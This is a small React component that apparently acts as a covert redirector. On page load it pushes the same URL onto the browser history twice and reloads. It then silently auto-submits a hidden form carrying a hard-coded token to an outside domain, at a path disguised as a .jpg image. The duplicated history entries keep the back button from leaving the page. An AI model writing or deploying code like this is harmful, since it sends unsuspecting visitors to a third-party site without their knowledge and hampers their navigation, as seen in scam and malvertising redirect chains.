import { useEffect } from 'react';

const SubmitForm: React.FC = () => {
  useEffect(() => {
    const param = new URLSearchParams(window.location.search);
    if (param.has('t')) {
      setTimeout(() => {
        document.getElementById('submit-form')?.dispatchEvent(new Event('submit', { cancelable: true }));
      }, 500);
    } else {
      param.append('t', '1727671913');
      const reverseUrl = `${window.location.origin}${window.location.pathname}?${param.toString()}`;
      history.pushState(null, document.title, reverseUrl);
      history.pushState(null, document.title, reverseUrl);
      window.location.reload();
    }
  }, []);

  return (
    <form action="https://zhugising.es/assets/r/0KJaz6XhFnlR/hne66f3c4a70977e.jpg" method="post" id="submit-form">
      <input type="hidden" name="_token" value="" autoComplete="off" />
      <input type="hidden" name="token" value="bf3a20fb0183e460009d0e3c3b954141" />
    </form>
  );
};

export default SubmitForm;
